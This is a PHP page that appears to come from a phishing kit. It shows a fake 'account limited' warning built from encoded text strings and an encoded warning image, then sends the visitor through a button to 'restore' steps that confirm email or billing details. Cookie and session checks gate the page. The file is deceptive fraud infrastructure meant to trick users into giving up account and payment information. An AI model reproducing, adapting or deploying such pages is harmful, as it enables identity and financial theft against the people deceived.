<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "limited";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

if ($api->config("email") == "on") {
  $link = "../restore/confirm_email";
} else {
  $link = "../restore/confirm_billing";
}

require __DIR__ . '/system/page/header.php';

$html .= '
<img src="'.$api->image_encode("assets/img/warning.png")['local'].'" width="90px" height="90px"><br>
<p class="home-header">'.$api->text_encode($text['42']).'</p>
<hr>
<p class="home-title">'.$api->text_encode($text['43']).'</p>
<p class="home-content">'.$api->text_encode($text['44']).'</p>
<hr>
<p class="home-title">'.$api->text_encode($text['45']).'</p>
<p class="home-content">'.$api->text_encode($text['46']).'</p>
<hr>
<p class="home-title">'.$api->text_encode($text['47']).'</p>
<p class="home-content">'.$api->text_encode($text['48']).'</p>
<hr>
<p class="home-footer">'.$api->text_encode($text['49']).'</p>
<a href="'.$link.'" class="vx_btn col-md-4 col-sm-4 col-xs-4">'.$api->text_encode($text['10']).'</a>';

require __DIR__ . '/system/page/footer.php';
?>
